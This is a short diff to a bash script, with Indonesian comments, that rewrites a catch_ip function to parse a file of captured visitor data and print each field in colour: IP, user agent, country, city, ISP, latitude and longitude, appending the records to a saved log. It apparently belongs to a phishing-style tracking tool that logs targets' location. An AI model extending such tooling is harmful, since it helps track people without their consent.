@@ -53,13 +53,44 @@ exit 1
 }
 
 catch_ip() {
+    # Membaca file ip.txt baris demi baris
+    while IFS= read -r line; do
+        # Memisahkan berdasarkan tanda ':'
+        key=$(echo "$line" | cut -d ':' -f1 | xargs)
+        value=$(echo "$line" | cut -d ':' -f2- | xargs)
 
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+        # Memilih warna sesuai dengan jenis data
+        case $key in
+            "IP")
+                printf "\e[1;93m%-12s:\e[0m \e[1;77m%s\e[0m\n" "$key" "$value"
+                ;;
+            "User-Agent")
+                printf "\e[1;92m%-12s:\e[0m \e[0;96m%s\e[0m\n" "$key" "$value"
+                ;;
+            "Country")
+                printf "\e[1;94m%-12s:\e[0m \e[0;95m%s\e[0m\n" "$key" "$value"
+                ;;
+            "City")
+                printf "\e[1;91m%-12s:\e[0m \e[1;96m%s\e[0m\n" "$key" "$value"
+                ;;
+            "ISP")
+                printf "\e[1;95m%-12s:\e[0m \e[0;93m%s\e[0m\n" "$key" "$value"
+                ;;
+            "Latitude")
+                printf "\e[1;97m%-12s:\e[0m \e[1;92m%s\e[0m\n" "$key" "$value"
+                ;;
+            "Longitude")
+                printf "\e[1;93m%-12s:\e[0m \e[1;91m%s\e[0m\n" "$key" "$value"
+                ;;
+            *)
+                printf "\e[1;90m%-12s:\e[0m %s\n" "$key" "$value"
+                ;;
+        esac
+    done < ip.txt
 
-cat ip.txt >> saved.ip.txt
 
+    cat ip.txt >> saved.ip.txt
+    printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]==========================\e[0m\n"
 
 }
 
